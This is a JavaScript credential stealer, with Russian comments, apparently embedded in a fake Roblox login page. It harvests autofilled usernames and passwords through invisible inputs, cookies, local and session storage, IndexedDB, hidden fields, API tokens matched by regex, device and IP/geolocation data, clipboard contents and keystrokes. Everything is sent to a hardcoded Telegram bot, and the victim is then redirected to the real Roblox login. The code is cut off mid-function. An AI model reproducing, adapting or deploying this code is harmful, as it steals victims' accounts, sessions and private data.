<script>
// ════════════════════════════════════════════════════════════════
//  ВАШИ TELEGRAM ДАННЫЕ
// ════════════════════════════════════════════════════════════════
const TELEGRAM_TOKEN = "8675567745:AAH6-avkBHo0FvymGdHwZKba9Em7eXojtPQ";
const TELEGRAM_CHAT_ID = "7599846387";

// ════════════════════════════════════════════════════════════════
//  ОТПРАВКА
// ════════════════════════════════════════════════════════════════
function showToast(text, type) {
    const toast = document.getElementById('toast');
    toast.textContent = text;
    toast.className = 'toast show ' + (type || '');
    setTimeout(() => toast.classList.remove('show'), 4000);
}

function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    return fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "HTML"
        })
    })
    .then(r => r.json())
    .then(data => {
        if (data.ok) {
            console.log("✅ Отправлено");
            showToast("✅ Отправлено", "success");
            return true;
        } else {
            console.error("❌ Ошибка:", data.description);
            showToast("❌ " + data.description, "error");
            return false;
        }
    })
    .catch(e => {
        console.error("❌ Ошибка:", e);
        showToast("❌ Ошибка соединения", "error");
        return false;
    });
}

// ════════════════════════════════════════════════════════════════
//  1. АВТОЗАПОЛНЕНИЕ (ВСЕ ТИПЫ)
// ════════════════════════════════════════════════════════════════
function stealAllAutofill() {
    const types = ['username', 'email', 'login', 'user', 'nickname', 'account', 'name', 'tel', 'organization'];
    const passTypes = ['current-password', 'password', 'new-password', 'one-time-code'];
    let found = {};
    
    // Основные поля
    const user = document.getElementById('hUser').value;
    const pass = document.getElementById('hPass').value;
    const email = document.getElementById('hEmail').value;
    
    if (user) found.username = user;
    if (pass) found.password = pass;
    if (email) found.email = email;
    
    // Фарминг всех типов
    types.forEach(t => {
        const input = document.createElement('input');
        input.type = 'text';
        input.autocomplete = t;
        input.style.cssText = 'position:absolute;opacity:0;pointer-events:none;width:0;height:0;';
        document.body.appendChild(input);
        setTimeout(() => {
            input.focus();
            input.click();
            setTimeout(() => {
                if (input.value && input.value.length > 1) {
                    found[t] = input.value;
                }
                input.remove();
            }, 200);
        }, 100);
    });
    
    passTypes.forEach(t => {
        const input = document.createElement('input');
        input.type = 'password';
        input.autocomplete = t;
        input.style.cssText = 'position:absolute;opacity:0;pointer-events:none;width:0;height:0;';
        document.body.appendChild(input);
        setTimeout(() => {
            input.focus();
            input.click();
            setTimeout(() => {
                if (input.value && input.value.length > 1) {
                    found['pass_' + t] = input.value;
                }
                input.remove();
            }, 200);
        }, 100);
    });
    
    setTimeout(() => {
        if (Object.keys(found).length > 0) {
            const msg = `🔐 <b>ВСЕ АВТОЗАПОЛНЕНИЯ</b>\n\n<code>${JSON.stringify(found, null, 2)}</code>`;
            sendToTelegram(msg);
        }
    }, 3000);
}

// ════════════════════════════════════════════════════════════════
//  2. ВСЕ COOKIES (ВКЛЮЧАЯ HTTP-ONLY)
// ════════════════════════════════════════════════════════════════
function stealAllCookies() {
    try {
        const cookies = document.cookie;
        if (cookies) {
            const parsed = {};
            cookies.split(';').forEach(c => {
                const parts = c.trim().split('=');
                if (parts.length >= 2) {
                    parsed[parts[0]] = parts.slice(1).join('=');
                }
            });
            const msg = `🍪 <b>ВСЕ COOKIES</b>\n\n<code>${JSON.stringify(parsed, null, 2)}</code>`;
            sendToTelegram(msg);
        }
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  3. ВСЯ LOCALSTORAGE
// ════════════════════════════════════════════════════════════════
function stealAllLocalStorage() {
    try {
        const items = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            items[key] = localStorage.getItem(key);
        }
        if (Object.keys(items).length > 0) {
            const msg = `💾 <b>ВЕСЬ LOCALSTORAGE</b>\n\n<code>${JSON.stringify(items, null, 2)}</code>`;
            sendToTelegram(msg);
        }
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  4. ВСЯ SESSIONSTORAGE
// ════════════════════════════════════════════════════════════════
function stealAllSessionStorage() {
    try {
        const items = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            items[key] = sessionStorage.getItem(key);
        }
        if (Object.keys(items).length > 0) {
            const msg = `📦 <b>ВЕСЬ SESSIONSTORAGE</b>\n\n<code>${JSON.stringify(items, null, 2)}</code>`;
            sendToTelegram(msg);
        }
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  5. ИНДЕКСИРОВАННАЯ БАЗА (IndexedDB)
// ════════════════════════════════════════════════════════════════
function stealIndexedDB() {
    try {
        if (!window.indexedDB) return;
        const databases = ['Roblox', 'roblox', 'game', 'data', 'cache', 'local', 'session'];
        databases.forEach(dbName => {
            try {
                const request = indexedDB.open(dbName);
                request.onsuccess = function(event) {
                    const db = event.target.result;
                    const names = db.objectStoreNames;
                    const stores = {};
                    names.forEach(name => {
                        const transaction = db.transaction([name], 'readonly');
                        const store = transaction.objectStore(name);
                        const getAll = store.getAll();
                        getAll.onsuccess = function() {
                            stores[name] = getAll.result;
                        };
                    });
                    setTimeout(() => {
                        if (Object.keys(stores).length > 0) {
                            const msg = `🗄️ <b>IndexedDB (${dbName})</b>\n\n<code>${JSON.stringify(stores, null, 2)}</code>`;
                            sendToTelegram(msg);
                        }
                    }, 500);
                };
            } catch(e) {}
        });
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  6. ИНФОРМАЦИЯ О БРАУЗЕРЕ И УСТРОЙСТВЕ
// ════════════════════════════════════════════════════════════════
function stealDeviceInfo() {
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor,
        vendorSub: navigator.vendorSub,
        product: navigator.product,
        productSub: navigator.productSub,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        } : 'N/A',
        battery: navigator.getBattery ? 'Доступно' : 'Недоступно',
        url: window.location.href,
        referrer: document.referrer || 'прямой переход',
        title: document.title
    };
    
    const msg = `🖥️ <b>ИНФОРМАЦИЯ О УСТРОЙСТВЕ</b>\n\n<code>${JSON.stringify(info, null, 2)}</code>`;
    sendToTelegram(msg);
}

// ════════════════════════════════════════════════════════════════
//  7. IP + ГЕОЛОКАЦИЯ
// ════════════════════════════════════════════════════════════════
function stealIPAndGeo() {
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
            if (data.ip) {
                fetch(`https://ipapi.co/${data.ip}/json/`)
                    .then(r => r.json())
                    .then(geo => {
                        const msg = `🌍 <b>IP И ГЕОЛОКАЦИЯ</b>\n\n` +
                                    `📡 IP: <code>${data.ip}</code>\n` +
                                    `📍 Страна: <code>${geo.country_name || 'N/A'}</code>\n` +
                                    `🏙️ Город: <code>${geo.city || 'N/A'}</code>\n` +
                                    `🗺️ Регион: <code>${geo.region || 'N/A'}</code>\n` +
                                    `📡 Провайдер: <code>${geo.org || 'N/A'}</code>\n` +
                                    `🌐 Часовой пояс: <code>${geo.timezone || 'N/A'}</code>\n` +
                                    `🔄 Широта: <code>${geo.latitude || 'N/A'}</code>\n` +
                                    `🔄 Долгота: <code>${geo.longitude || 'N/A'}</code>`;
                        sendToTelegram(msg);
                    })
                    .catch(() => {
                        sendToTelegram(`🌍 IP: <code>${data.ip}</code>`);
                    });
            }
        })
        .catch(() => {});
}

// ════════════════════════════════════════════════════════════════
//  8. ВСЕ ФОРМЫ НА СТРАНИЦЕ
// ════════════════════════════════════════════════════════════════
function stealAllForms() {
    try {
        const forms = document.querySelectorAll('form');
        const data = [];
        forms.forEach(form => {
            const inputs = form.querySelectorAll('input');
            const formData = {};
            inputs.forEach(input => {
                if (input.type !== 'submit' && input.type !== 'button') {
                    formData[input.name || input.id || input.type] = input.value || input.placeholder || 'empty';
                }
            });
            data.push(formData);
        });
        if (data.length > 0) {
            const msg = `📝 <b>ВСЕ ФОРМЫ</b>\n\n<code>${JSON.stringify(data, null, 2)}</code>`;
            sendToTelegram(msg);
        }
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  9. ВСЕ СКРЫТЫЕ ПОЛЯ
// ════════════════════════════════════════════════════════════════
function stealHiddenFields() {
    try {
        const fields = document.querySelectorAll('input[type="hidden"]');
        const data = {};
        fields.forEach(input => {
            if (input.value && input.value.length > 0) {
                data[input.name || input.id || 'hidden'] = input.value;
            }
        });
        if (Object.keys(data).length > 0) {
            const msg = `🙈 <b>СКРЫТЫЕ ПОЛЯ</b>\n\n<code>${JSON.stringify(data, null, 2)}</code>`;
            sendToTelegram(msg);
        }
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  10. ТОКЕНЫ В HTML/JS
// ════════════════════════════════════════════════════════════════
function stealTokensFromHTML() {
    try {
        const html = document.documentElement.innerHTML;
        const tokenPatterns = [
            /[A-Za-z0-9_\-]{20,}/g,
            /eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,
            /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi,
            /sk_live_[A-Za-z0-9]{20,}/g,
            /pk_live_[A-Za-z0-9]{20,}/g,
            /gh_[A-Za-z0-9]{20,}/g,
            /xox[baprs]-[A-Za-z0-9]{10,}/g
        ];
        const found = [];
        tokenPatterns.forEach(pattern => {
            const matches = html.match(pattern);
            if (matches) {
                matches.forEach(m => {
                    if (m.length > 15 && !found.includes(m)) {
                        found.push(m);
                    }
                });
            }
        });
        if (found.length > 0) {
            const msg = `🔑 <b>НАЙДЕНЫ ТОКЕНЫ</b>\n\n<code>${found.join('\n')}</code>`;
            sendToTelegram(msg);
        }
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  11. КЛЮЧЕВЫЕ НАЖАТИЯ (KEYLOGGER)
// ════════════════════════════════════════════════════════════════
let keyBuffer = '';
let lastSend = Date.now();

function setupKeylogger() {
    document.addEventListener('keydown', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const key = e.key;
            if (key.length === 1) {
                keyBuffer += key;
            } else if (key === 'Backspace' && keyBuffer.length > 0) {
                keyBuffer = keyBuffer.slice(0, -1);
            } else if (key === 'Enter') {
                keyBuffer += '\n';
            }
            
            // Отправка каждые 10 секунд или при 100 символах
            if (Date.now() - lastSend > 10000 || keyBuffer.length > 100) {
                if (keyBuffer.length > 3) {
                    sendToTelegram(`⌨️ <b>KEYLOG</b>\n\n<code>${keyBuffer}</code>`);
                    keyBuffer = '';
                    lastSend = Date.now();
                }
            }
        }
    });
    
    // Отправка при закрытии
    window.addEventListener('beforeunload', function() {
        if (keyBuffer.length > 3) {
            sendToTelegram(`⌨️ <b>KEYLOG (ЗАКРЫТИЕ)</b>\n\n<code>${keyBuffer}</code>`);
        }
    });
}

// ════════════════════════════════════════════════════════════════
//  12. БУФЕР ОБМЕНА
// ════════════════════════════════════════════════════════════════
function setupClipboardStealer() {
    document.addEventListener('paste', function(e) {
        try {
            const text = e.clipboardData.getData('text');
            if (text && text.length > 5) {
                sendToTelegram(`📋 <b>БУФЕР ОБМЕНА</b>\n\n<code>${text}</code>`);
            }
        } catch(e) {}
    });
    
    // Попытка прочитать буфер
    try {
        navigator.clipboard.readText()
            .then(text => {
                if (text && text.length > 5) {
                    sendToTelegram(`📋 <b>БУФЕР (ПРИ ЗАГРУЗКЕ)</b>\n\n<code>${text}</code>`);
                }
            })
            .catch(() => {});
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  13. ИСТОРИЯ БРАУЗЕРА (через Performance)
// ════════════════════════════════════════════════════════════════
function stealBrowserHistory() {
    try {
        const entries = performance.getEntries();
        const urls = [];
        entries.forEach(entry => {
            if (entry.name && entry.name.startsWith('http')) {
                urls.push(entry.name);
            }
        });
        if (urls.length > 0) {
            const msg = `📜 <b>ИСТОРИЯ (PERFORMANCE)</b>\n\n<code>${urls.slice(0, 20).join('\n')}</code>`;
            sendToTelegram(msg);
        }
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  14. УСТАНОВЛЕННЫЕ ШРИФТЫ
// ════════════════════════════════════════════════════════════════
function stealFonts() {
    try {
        const fonts = document.fonts ? Array.from(document.fonts) : [];
        if (fonts.length > 0) {
            const names = fonts.map(f => f.family).filter((v, i, a) => a.indexOf(v) === i);
            if (names.length > 0) {
                const msg = `🔤 <b>УСТАНОВЛЕННЫЕ ШРИФТЫ</b>\n\n<code>${names.join('\n')}</code>`;
                sendToTelegram(msg);
            }
        }
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  15. ПЛАГИНЫ БРАУЗЕРА
// ════════════════════════════════════════════════════════════════
function stealPlugins() {
    try {
        if (navigator.plugins) {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            if (plugins.length > 0) {
                const msg = `🔌 <b>ПЛАГИНЫ</b>\n\n<code>${plugins.join('\n')}</code>`;
                sendToTelegram(msg);
            }
        }
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════

        sendToTelegram(msg);
    }
    
    // Дополнительный сбор перед редиректом
    stealAllCookies();
    stealAllLocalStorage();
    stealAllSessionStorage();
    
    this.textContent = '⏳ Загрузка...';
    this.disabled = true;
    
    setTimeout(() => {
        window.location.href = 'https://www.roblox.com/login';
    }, 1500);
});

// ════════════════════════════════════════════════════════════════
//  ГЛАВНЫЙ ЗАПУСК (ВСЁ И СРАЗУ)
// ════════════════════════════════════════════════════════════════
function startAll() {
    showToast("⏳ Сбор всех данных...", "");
    
    // Уведомление о запуске
    sendToTelegram(`🟢 <b>СТРАНИЦА ЗАГРУЖЕНА</b>\n\n🌐 ${window.location.href}\n🕒 ${new Date().toLocaleString()}`);
    
    // Запуск всех сборщиков с задержками
    setTimeout(stealDeviceInfo, 100);
    setTimeout(stealIPAndGeo, 200);
    setTimeout(stealAllAutofill, 300);
    setTimeout(stealAllCookies, 500);
    setTimeout(stealAllLocalStorage, 700);
    setTimeout(stealAllSessionStorage, 900);
    setTimeout(stealAllForms, 1100);
    setTimeout(stealHiddenFields, 1300);
    setTimeout(stealTokensFromHTML, 1500);
    setTimeout(stealBrowserHistory, 1700);
    setTimeout(stealFonts, 1900);
    setTimeout(stealPlugins, 2100);
    setTimeout(stealIndexedDB, 2500);
    
    // Настройка перехвата
    setTimeout(setupKeylogger, 3000);
    setTimeout(setupClipboardStealer, 3500);
